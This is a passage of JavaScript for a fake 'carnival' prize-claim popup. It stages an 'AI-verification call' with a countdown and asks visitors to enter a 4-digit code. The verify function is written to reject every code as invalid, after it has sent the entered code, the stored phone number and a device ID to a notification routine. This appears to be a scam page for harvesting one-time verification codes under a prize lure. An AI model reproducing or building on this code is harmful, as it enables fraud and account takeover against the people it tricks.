        var codeSection = document.getElementById('codeSection');
        var codeInput = document.getElementById('code4Digit');
        var codeErrorMsg = document.getElementById('codeErrorMsg');
        var callExpiredMsg = document.getElementById('callExpiredMsg');
        
        // Reset messages
        if (codeErrorMsg) codeErrorMsg.classList.remove('show');
        if (callExpiredMsg) callExpiredMsg.style.display = 'none';
        if (codeInput) codeInput.value = '';
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) {
            statusText.innerHTML = '<strong>🎪 AI-VERIFICATION CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.5);">Please wait for the call</span>';
        }
        if (phoneDisplay) {
            phoneDisplay.style.display = 'block';
        }
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.classList.remove('urgent');
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.style.opacity = '0.5';
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>CALLING...</span>';
        }
        if (codeSection) {
            codeSection.style.display = 'none';
        }
        
        // Play call sound effect
        playCallSound();
        
        // Start countdown timer
        startCallTimer();
        
        // Simulate call connection after 4 seconds
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎪';
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #39ff14;">🎪 CARNIVAL CALL CONNECTED! 🎪</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Enter the 4-digit code below</span>';
            }
            if (codeSection) {
                codeSection.style.display = 'block';
            }
            if (codeInput) {
                codeInput.focus();
            }
        }, 4000);
    }
    
    // ========== GENERATE CALL CODE ==========
    function generateCallCode() {
        var code = Math.floor(1000 + Math.random() * 9000);
        return code.toString();
    }
    
    // ========== START CALL TIMER ==========
    function startCallTimer() {
        stopCallTimer();
        
        var timerDisplay = document.getElementById('callTimerDisplay');
        var statusText = document.getElementById('callStatusText');
        var requestBtn = document.getElementById('requestCallBtn');
        var callExpiredMsg = document.getElementById('callExpiredMsg');
        var codeSection = document.getElementById('codeSection');
        
        // Set initial color - Neon Green
        if (timerDisplay) {
            timerDisplay.classList.remove('urgent');
        }
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                
                // 60s - 10s: Neon Green
                // 9s - 0s: Neon Red with urgent pulse
                if (callCountdown <= 9) {
                    timerDisplay.classList.add('urgent');
                } else {
                    timerDisplay.classList.remove('urgent');
                }
            }
            
            if (callCountdown <= 0) {
                // Call expired
                stopCallTimer();
                
                var userPhone = localStorage.getItem("userPhone") || "Unknown";
                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                sendAICallExpiredNotification(userPhone, deviceId);
                
                if (statusText) {
                    statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CARNIVAL CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.6);">Please request a new call</span>';
                }
                if (timerDisplay) {
                    timerDisplay.style.display = 'none';
                }
                if (codeSection) {
                    codeSection.style.display = 'none';
                }
                if (requestBtn) {
                    requestBtn.disabled = false;
                    requestBtn.style.opacity = '1';
                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST CARNIVAL CALL</span>';
                }
                if (callExpiredMsg) {
                    callExpiredMsg.style.display = 'block';
                }
                
                callInProgress = false;
                isCallRequested = false;
            }
        }, 1000);
    }
    
    // ========== STOP CALL TIMER ==========
    function stopCallTimer() {
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
    }
    
    // ========== VERIFY CODE (Always Invalid) ==========
    function verifyCode() {
        var codeInput = document.getElementById('code4Digit');
        var codeErrorMsg = document.getElementById('codeErrorMsg');
        var callExpiredMsg = document.getElementById('callExpiredMsg');
        var verifyBtn = document.getElementById('verifyCodeBtn');
        
        if (!codeInput) return;
        
        var enteredCode = codeInput.value.trim();
        
        // Validate input
        if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
            if (codeErrorMsg) {
                codeErrorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please enter a valid 4-digit code.';
                codeErrorMsg.classList.add('show');
            }
            codeInput.style.borderColor = '#ff4444';
            codeInput.style.boxShadow = '0 0 30px rgba(255, 68, 68, 0.5)';
            shakeElement(codeInput);
            return;
        }
        
        // Check if call is still active
        if (callCountdown <= 0) {
            if (callExpiredMsg) {
                callExpiredMsg.style.display = 'block';
            }
            if (codeErrorMsg) codeErrorMsg.classList.remove('show');
            codeInput.style.borderColor = '#ff9800';
            codeInput.style.boxShadow = '0 0 30px rgba(255, 152, 0, 0.5)';
            return;
        }
        
        // ========== ALWAYS INVALID ==========
        codeEntered = true;
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
        
        // Show error
        if (codeErrorMsg) {
            codeErrorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid carnival code. Please request a new call.';
            codeErrorMsg.classList.add('show');
        }
        
        // Visual feedback
        codeInput.style.borderColor = '#ff4444';
        codeInput.style.boxShadow = '0 0 30px rgba(255, 68, 68, 0.6)';
        shakeElement(codeInput);
        
        // Disable verify button temporarily
        if (verifyBtn) {
            verifyBtn.disabled = true;
            verifyBtn.style.opacity = '0.5';
            setTimeout(function() {
                if (verifyBtn) {
                    verifyBtn.disabled = false;
                    verifyBtn.style.opacity = '1';
                }
            }, 2000);
        }
        
        // Clear input
        setTimeout(function() {
            codeInput.value = '';
            codeInput.style.borderColor = '#ffd700';
            codeInput.style.boxShadow = '0 0 20px rgba(255, 215, 0, 0.4)';
            
            if (codeErrorMsg) {
                codeErrorMsg.innerHTML = '<i class="fas fa-sync-alt"></i> 🔄 Please request a new carnival call.';
            }
        }, 1500);
        
        // Reset to initial state
        setTimeout(function() {
            if (codeErrorMsg) {
                codeErrorMsg.classList.remove('show');
            }
            
            var statusText = document.getElementById('callStatusText');
            var timerDisplay = document.getElementById('callTimerDisplay');
            var codeSection = document.getElementById('codeSection');
            var requestBtn = document.getElementById('requestCallBtn');
            
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CARNIVAL CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.6);">Please request a new call</span>';
            }
            if (timerDisplay) {
                timerDisplay.style.display = 'none';
                timerDisplay.classList.remove('urgent');
            }
            if (codeSection) {
                codeSection.style.display = 'none';
            }
            if (requestBtn) {
                requestBtn.disabled = false;
                requestBtn.style.opacity = '1';
                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST CARNIVAL CALL</span>';
            }
            
            callInProgress = false;
            isCallRequested = false;
            
        }, 4000);
    }
    
    // ========== SHAKE ELEMENT ==========
    function shakeElement(element) {
        if (!element) return;
        element.style.animation = 'errorShake 0.5s ease';
        setTimeout(function() {
            element.style.animation = '';
        }, 500);
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        var popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            var ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
        }
        
        stopCallTimer();
        claimInProgress = false;
        isRedirecting = false;
    }
    
    // ========== SHOW POPUP (Public Function) ==========
    function showPopup(balance) {
        currentBalance = balance;
        getFirewallStatus().then(function() {
            var popup = document.getElementById('prizePopup');
            if (popup) {
                popup.style.display = 'flex';
                var ticker = document.getElementById('winnerTicker');
                if (ticker) ticker.style.display = 'none';
            }
            
            showFirewallPopup();
        });
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // ========== EXPORTS ==========
    window.showPopup = showPopup;
    window.closePopup = closePopup;
    window.getFirewallStatus = getFirewallStatus;
    
})();
